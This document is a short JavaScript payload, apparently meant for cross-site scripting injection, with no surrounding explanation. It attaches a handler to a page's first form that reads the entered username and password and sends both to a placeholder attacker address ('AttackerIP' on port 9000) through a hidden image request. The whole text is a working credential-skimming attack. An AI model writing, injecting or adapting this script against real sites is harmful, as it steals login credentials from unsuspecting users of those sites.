<script>

function InterceptForm(){

 var username = document.forms[0].elements[0].value;
 var password = document.forms[0].elements[1].value;
 new Image().src = "http://AttackerIP:9000/?username="+username+"&password="+password;
 
}

document.forms[0].onsubmit = InterceptForm;

</script>
